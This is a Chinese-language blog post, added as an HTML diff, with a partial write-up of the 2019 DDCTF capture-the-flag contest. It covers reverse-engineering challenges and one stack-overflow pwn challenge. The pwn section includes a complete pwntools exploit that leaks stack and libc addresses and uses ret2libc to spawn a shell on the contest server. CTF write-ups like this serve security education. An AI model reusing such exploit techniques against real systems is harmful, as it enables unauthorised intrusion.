@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        2019DDCTF部分Writeup - 一筐萝卜
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> 你若盛开，清风自来！ </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar radius">
+            <img src="/img/avatar.jpg" />
+        </div>
+        <div class="name">
+            <i>一筐萝卜</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>SEARCH</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#re"><span class="toc-text">re</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-Reverse1"><span class="toc-text">Windows Reverse1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flag：DDCTF-ZZ-JX-9-9-9QY"><span class="toc-text">flag：DDCTF{ZZ[JX#,9(9,+9QY!}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-Reverse2"><span class="toc-text">Windows Reverse2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flag-DDCTF-ADEBDEAEC7BE"><span class="toc-text">flag:DDCTF{ADEBDEAEC7BE}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Confused"><span class="toc-text">Confused</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flag：DDCTF-helloYouGotTheFlag"><span class="toc-text">flag：DDCTF{helloYouGotTheFlag}</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PWN-strike"><span class="toc-text">[PWN] strike</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#第一处漏洞点"><span class="toc-text">第一处漏洞点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第二处漏洞点"><span class="toc-text">第二处漏洞点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第三处漏洞点"><span class="toc-text">第三处漏洞点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flag：DDCTF-s0-3asy-St4ck0verfl0w-r1ght"><span class="toc-text">flag：DDCTF{s0_3asy_St4ck0verfl0w_r1ght?}</span></a></li></ol></li></ol></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> 你若盛开，清风自来！ </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        2019DDCTF部分Writeup
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2019-04-18 17:17:42</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#WP" title="WP">WP</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content no-indent">
+        <p>……</p>
+<a id="more"></a>
+<h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="Windows-Reverse1"><a href="#Windows-Reverse1" class="headerlink" title="Windows Reverse1"></a>Windows Reverse1</h3><p>通过DIE查壳发现存在upx，在linux上upx -d脱壳即可，拖入IDA，通过关键字符串找到关键函数：</p>
+<p>main函数中也没有什么，将输入的字符串带到sub_401000函数去处理，之后和处理过后的字符串和正确字符串进行比较，若一致则是正确flag<br><img src="https://s2.ax1x.com/2019/04/18/ESfKYt.png" alt><br>跟进sub_401000，首先计算了输出字符串的长度，然后根据每一个字符的ascii码再加上一个常量作为地址，取里面的值，循环，每一位都是这样<br><img src="https://s2.ax1x.com/2019/04/18/ESf1l8.png" alt><br>在main函数中我们知道正确的字符串，那么我们就可以反推处flag</p>
+<p>exp：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">0x403052</span>,<span class="number">0x403052</span>,<span class="number">0x403053</span>,<span class="number">0x403042</span>,<span class="number">0x403050</span>,<span class="number">0</span>x40301B,<span class="number">0x403024</span>,<span class="number">0x403031</span>,<span class="number">0x403020</span>,<span class="number">0x403031</span>,<span class="number">0x403024</span>,<span class="number">0x403023</span>,<span class="number">0x403031</span>,<span class="number">0x403049</span>,<span class="number">0x403051</span>,<span class="number">0x403019</span>]</span><br><span class="line">flag = ""</span><br><span class="line">for x in range(len(data)):</span><br><span class="line">	flag+=chr(data[x]-<span class="number">0</span>x402ff8)</span><br><span class="line">print "DDCTF&#123;"+flag+"&#125;"</span><br></pre></td></tr></table></figure>
+
+<h4 id="flag：DDCTF-ZZ-JX-9-9-9QY"><a href="#flag：DDCTF-ZZ-JX-9-9-9QY" class="headerlink" title="flag：DDCTF{ZZ[JX#,9(9,+9QY!}"></a>flag：DDCTF{ZZ[JX#,9(9,+9QY!}</h4><h3 id="Windows-Reverse2"><a href="#Windows-Reverse2" class="headerlink" title="Windows Reverse2"></a>Windows Reverse2</h3><p>查壳发现是ASPack壳，我用工具脱没脱下来，只好手动脱，根据栈平衡可以顺利找到eop，然后从内存中dump下来，载入IDA中，找到关键函数：</p>
+<p>sub_4011F0函数验证了用户输出的合法性，然后再经过sub_401240和sub_401C6A处理，再和正确字符串相比较<br><img src="https://s2.ax1x.com/2019/04/18/ESf8Og.png" alt><br>验证合法性的函数很简单，限制了0-9，A-F<br><img src="https://s2.ax1x.com/2019/04/18/ESfUkn.png" alt><br>接下来看数据处理函数，静态分析后也没明白是干什么的，通过交叉引用函数，发现sub_401000存在base64算法，但是这道题把索引表给隐藏起来了，题目所提供的索引表和0x76异或之后构成base64的索引表</p>
+<p>动态调试的时候，我们输入123456789A的时候，发现sub_401000返回了一串字符串：<br><img src="https://s2.ax1x.com/2019/04/18/ESfdf0.png" alt><br>更加确定这个是base64加密了，解密发现，这个题目是将我门输入的字符串直接转成了数据</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import <span class="built_in">base64</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">base64</span>.b64decode(<span class="string">"EjRWeJo="</span>).encode(<span class="string">"hex"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>所以我们直接将正确字符串base64解密即可得到flag：</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import <span class="built_in">base64</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">"DDCTF&#123;"</span>+<span class="built_in">base64</span>.b64decode(<span class="string">"reverse+"</span>).encode(<span class="string">"hex"</span>).upper()+<span class="string">"&#125;"</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="flag-DDCTF-ADEBDEAEC7BE"><a href="#flag-DDCTF-ADEBDEAEC7BE" class="headerlink" title="flag:DDCTF{ADEBDEAEC7BE}"></a>flag:DDCTF{ADEBDEAEC7BE}</h4><h3 id="Confused"><a href="#Confused" class="headerlink" title="Confused"></a>Confused</h3><p>这道题一开始我没看出来，后来kaller师傅给我了一个提示：VM 虚拟机</p>
+<p>再反过来头看程序，恍然大悟</p>
+<p>首先题目是一个app，应该是在MacOS上的app，这是我第一次做，边百度边做</p>
+<p>在MacOS中发现一个可执行文件，xia0Crackme</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  MacOS file xia0Crackme </span><br><span class="line">xia0Crackme: Mach-O <span class="number">64</span>-bit x86_64 executable, flags:&lt;NOUNDEFS|<span class="type">DYLDLINK</span>|<span class="type">TWOLEVEL</span>|<span class="type">PIE</span>&gt;</span><br><span class="line">➜  MacOS</span><br></pre></td></tr></table></figure>
+
+<p>拖入IDA查找字符串来定位关键函数：</p>
+<p><img src="https://s2.ax1x.com/2019/04/18/ESfBlT.png" alt> </p>
+<p>main函数中，大致过程就是先对输入的字符串进行格式上的验证，长度上限制是18,然后进入到sub_1000011D0进行处理，若返回值等于1，则是正确的flag<br><img src="https://s2.ax1x.com/2019/04/18/ESfrXF.png" alt><br>在sub_1000011D0函数中首先初始化了一个区域v2<br><img src="https://s2.ax1x.com/2019/04/18/EShKHJ.png" alt><br>sub_100001f60是通过输入的字符串和内存数据对v2进行赋值操作<br><img src="https://s2.ax1x.com/2019/04/18/EShlNR.png" alt><br>前段是对v2进行赋值，最后将输入的字符串拷贝到qword_100003F58+48的位置</p>
+<p>sub_100001F00函数对(*v2+24)进行了赋值，把一段数据赋给了它，接着是一个循环，判断条件就是刚刚赋值的数据是不是等于“0xf3”，</p>
+<p>然后进入sub_100001E50，这个函数一开始我还没看出来是什么意思，后来发现这是一个VM类型的题，，这个函数的作用是控制程序执行的vm的分支<br><img src="https://s2.ax1x.com/2019/04/18/ESh89x.png" alt><br>各个分支的函数我这里就不再详细讲解</p>
+<p>数据：</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xf0</span>,<span class="number">0x10</span>,<span class="number">0x66</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,</span><br><span class="line"><span class="number">0xf8</span>,</span><br><span class="line"><span class="number">0xf2</span>,<span class="number">0x30</span>,</span><br><span class="line"><span class="number">0xf6</span>,<span class="number">0xc1</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xf0</span>,<span class="number">0x10</span>,<span class="number">0x63</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,</span><br><span class="line"><span class="number">0xf8</span>,</span><br><span class="line"><span class="number">0xf2</span>,<span class="number">0x31</span>,</span><br><span class="line"><span class="number">0xf6</span>,<span class="number">0xb6</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xf0</span>,<span class="number">0x10</span>,<span class="number">0x6a</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,</span><br><span class="line"><span class="number">0xf8</span>,</span><br><span class="line"><span class="number">0xf2</span>,<span class="number">0x32</span>,</span><br><span class="line"><span class="number">0xf6</span>,<span class="number">0xab</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xf0</span>,<span class="number">0x10</span>,<span class="number">0x6a</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,</span><br><span class="line"><span class="number">0xf8</span>,</span><br><span class="line"><span class="number">0xf2</span>,<span class="number">0x33</span>,</span><br><span class="line"><span class="number">0xf6</span>,<span class="number">0xa0</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xf0</span>,<span class="number">0x10</span>,<span class="number">0x6d</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,</span><br><span class="line"><span class="number">0xf8</span>,</span><br><span class="line"><span class="number">0xf2</span>,<span class="number">0x34</span>,</span><br><span class="line"><span class="number">0xf6</span>,<span class="number">0x95</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xf0</span>,<span class="number">0x10</span>,<span class="number">0x57</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,</span><br><span class="line"><span class="number">0xf8</span>,</span><br><span class="line"><span class="number">0xf2</span>,<span class="number">0x35</span>,</span><br><span class="line"><span class="number">0xf6</span>,<span class="number">0x8a</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xf0</span>,<span class="number">0x10</span>,<span class="number">0x6d</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,</span><br><span class="line"><span class="number">0xf8</span>,</span><br><span class="line"><span class="number">0xf2</span>,<span class="number">0x36</span>,</span><br><span class="line"><span class="number">0xf6</span>,<span class="number">0x7f</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xf0</span>,<span class="number">0x10</span>,<span class="number">0x73</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,</span><br><span class="line"><span class="number">0xf8</span>,</span><br><span class="line"><span class="number">0xf2</span>,<span class="number">0x37</span>,</span><br><span class="line"><span class="number">0xf6</span>,<span class="number">0x74</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xf0</span>,<span class="number">0x10</span>,<span class="number">0x45</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,</span><br><span class="line"><span class="number">0xf8</span>,</span><br><span class="line"><span class="number">0xf2</span>,<span class="number">0x38</span>,</span><br><span class="line"><span class="number">0xf6</span>,<span class="number">0x69</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xf0</span>,<span class="number">0x10</span>,<span class="number">0x6d</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,</span><br><span class="line"><span class="number">0xf8</span>,</span><br><span class="line"><span class="number">0xf2</span>,<span class="number">0x39</span>,</span><br><span class="line"><span class="number">0xf6</span>,<span class="number">0x5e</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xf0</span>,<span class="number">0x10</span>,<span class="number">0x72</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,</span><br><span class="line"><span class="number">0xf8</span>,</span><br><span class="line"><span class="number">0xf2</span>,<span class="number">0x3a</span>,</span><br><span class="line"><span class="number">0xf6</span>,<span class="number">0x53</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xf0</span>,<span class="number">0x10</span>,<span class="number">0x52</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,</span><br><span class="line"><span class="number">0xf8</span>,</span><br><span class="line"><span class="number">0xf2</span>,<span class="number">0x3b</span>,</span><br><span class="line"><span class="number">0xf6</span>,<span class="number">0x48</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xf0</span>,<span class="number">0x10</span>,<span class="number">0x66</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,</span><br><span class="line"><span class="number">0xf8</span>,</span><br><span class="line"><span class="number">0xf2</span>,<span class="number">0x3c</span>,</span><br><span class="line"><span class="number">0xf6</span>,<span class="number">0x3d</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xf0</span>,<span class="number">0x10</span>,<span class="number">0x63</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,</span><br><span class="line"><span class="number">0xf8</span>,</span><br><span class="line"><span class="number">0xf2</span>,<span class="number">0x3d</span>,</span><br><span class="line"><span class="number">0xf6</span>,<span class="number">0x32</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xf0</span>,<span class="number">0x10</span>,<span class="number">0x44</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,</span><br><span class="line"><span class="number">0xf8</span>,</span><br><span class="line"><span class="number">0xf2</span>,<span class="number">0x3e</span>,</span><br><span class="line"><span class="number">0xf6</span>,<span class="number">0x27</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xf0</span>,<span class="number">0x10</span>,<span class="number">0x6a</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,</span><br><span class="line"><span class="number">0xf8</span>,</span><br><span class="line"><span class="number">0xf2</span>,<span class="number">0x3f</span>,</span><br><span class="line"><span class="number">0xf6</span>,<span class="number">0x1c</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xf0</span>,<span class="number">0x10</span>,<span class="number">0x79</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,</span><br><span class="line"><span class="number">0xf8</span>,</span><br><span class="line"><span class="number">0xf2</span>,<span class="number">0x40</span>,</span><br><span class="line"><span class="number">0xf6</span>,<span class="number">0x11</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xf0</span>,<span class="number">0x10</span>,<span class="number">0x65</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,</span><br><span class="line"><span class="number">0xf8</span>,</span><br><span class="line"><span class="number">0xf2</span>,<span class="number">0x41</span>,</span><br><span class="line"><span class="number">0xf6</span>,<span class="number">0x6</span>,</span><br><span class="line"><span class="number">0xf7</span>,<span class="number">0x1</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0xf3</span></span><br></pre></td></tr></table></figure>
+
+<p>总共是两中处理方式<br><img src="https://s2.ax1x.com/2019/04/18/EShG36.png" alt> </p>
+<p>exp：</p>
+<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">data</span> = [0x66,0x63,0x6a,0x6a,0x6d,0x57,0x6d,0x73,0x45,0x6d,0x72,0x52,0x66,0x63,0x44,0x6a,0x79,0x65]</span></span><br><span class="line"><span class="title">flag</span> = <span class="string">""</span></span><br><span class="line"><span class="title">for</span> x <span class="keyword">in</span> range(len(<span class="class"><span class="keyword">data</span>)):</span></span><br><span class="line">	<span class="keyword">if</span> <span class="number">0x41</span>&lt;=<span class="class"><span class="keyword">data</span>[x] and <span class="keyword">data</span>[x]&lt;=0x5a:</span></span><br><span class="line">		flag += chr((<span class="number">2</span>+<span class="class"><span class="keyword">data</span>[x]-65)%26+65)</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		flag += chr((<span class="number">2</span>+<span class="class"><span class="keyword">data</span>[x]-97)%26+97)</span></span><br><span class="line"><span class="title">print</span> <span class="string">"DDCTF&#123;"</span>+flag+<span class="string">"&#125;"</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="flag：DDCTF-helloYouGotTheFlag"><a href="#flag：DDCTF-helloYouGotTheFlag" class="headerlink" title="flag：DDCTF{helloYouGotTheFlag}"></a>flag：DDCTF{helloYouGotTheFlag}</h4><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="PWN-strike"><a href="#PWN-strike" class="headerlink" title="[PWN] strike"></a>[PWN] strike</h3><p>这个相对来说是比较简单的，设计到的只有栈溢出，但是这个栈溢出有点和之前的不一样</p>
+<h4 id="第一处漏洞点"><a href="#第一处漏洞点" class="headerlink" title="第一处漏洞点"></a>第一处漏洞点</h4><p>fprintf处存在泄露栈地址</p>
+<h4 id="第二处漏洞点"><a href="#第二处漏洞点" class="headerlink" title="第二处漏洞点"></a>第二处漏洞点</h4><p>通过负数来绕过对password输入长度的限制</p>
+<h4 id="第三处漏洞点"><a href="#第三处漏洞点" class="headerlink" title="第三处漏洞点"></a>第三处漏洞点</h4><p>在读入password时可造成栈溢出</p>
+<p>但是在栈溢出的时候ECX不能变，需要把ECX的值计算出来填充到我们的payload中</p>
+<p>exp：</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']</span><br><span class="line">debug = 1</span><br><span class="line"></span><br><span class="line">if debug:</span><br><span class="line">	r = remote(<span class="string">"116.85.48.105"</span>,5005)</span><br><span class="line">	file = ELF(<span class="string">"./xpwn"</span>)</span><br><span class="line">	libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"><span class="section">else:</span></span><br><span class="line">	r = process(<span class="string">"./xpwn"</span>)</span><br><span class="line">	file = ELF(<span class="string">"./xpwn"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak stack addr</span></span><br><span class="line">r.recv()</span><br><span class="line">payload = <span class="string">"a"</span>*40</span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvuntil(<span class="string">"Hello "</span>+<span class="string">"a"</span>*40)</span><br><span class="line">leak_stack = u32(r.recv()[0:4])</span><br><span class="line">ecx_stack = leak_stack+0x18</span><br><span class="line">log.info(<span class="string">"leak_stack --&gt; "</span>+hex(leak_stack))</span><br><span class="line">log.info(<span class="string">"ecx_stack --&gt; "</span>+hex(ecx_stack))</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">"-123456"</span>)</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak real addr</span></span><br><span class="line">main_addr = 0x8048669</span><br><span class="line">puts_plt = file.plt['puts']</span><br><span class="line">read_got = file.got['read']</span><br><span class="line">payload = <span class="string">"a"</span>*68+p32(ecx_stack)+<span class="string">"a"</span>*24+p32(puts_plt)+p32(main_addr)+p32(read_got)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">"All done, bye!"</span>)</span><br><span class="line">str1 = r.recv()</span><br><span class="line">read_real = u32(str1[1:5])</span><br><span class="line">read_libc = libc.symbols['read']</span><br><span class="line">base_addr = read_real-read_libc</span><br><span class="line"><span class="section">log.info("base_addr:"+hex(base_addr))</span></span><br><span class="line">system_addr = libc.symbols['system']+base_addr</span><br><span class="line">binsh_addr = 0x0015902b+base_addr</span><br><span class="line"><span class="section">log.info("binsh_addr:"+hex(binsh_addr))</span></span><br><span class="line"><span class="section">log.info("system_addr:"+hex(system_addr))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># getshell</span></span><br><span class="line">payload = <span class="string">"a"</span>*40</span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvuntil(<span class="string">"Hello "</span>+<span class="string">"a"</span>*40)</span><br><span class="line">leak_stack = u32(r.recv()[0:4])</span><br><span class="line">ecx_stack = leak_stack+0x18</span><br><span class="line">log.info(<span class="string">"leak_stack --&gt; "</span>+hex(leak_stack))</span><br><span class="line">log.info(<span class="string">"ecx_stack --&gt; "</span>+hex(ecx_stack))</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">"-123456"</span>)</span><br><span class="line">r.recv()</span><br><span class="line">payload = <span class="string">"a"</span>*68+p32(ecx_stack)+<span class="string">"a"</span>*24+p32(system_addr)+p32(main_addr)+p32(binsh_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">"All done, bye!"</span>)</span><br><span class="line">sleep(0.1)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.ax1x.com/2019/04/18/EShJgK.png" alt> </p>
+<h4 id="flag：DDCTF-s0-3asy-St4ck0verfl0w-r1ght"><a href="#flag：DDCTF-s0-3asy-St4ck0verfl0w-r1ght" class="headerlink" title="flag：DDCTF{s0_3asy_St4ck0verfl0w_r1ght?}"></a>flag：DDCTF{s0_3asy_St4ck0verfl0w_r1ght?}</h4>
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        转发请备注<a href=“https://luobuming.github.io”>一筐萝卜</a>的个人博客 <br>
+        本站总访问量<span id="busuanzi_value_site_pv"></span>次
+       </p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
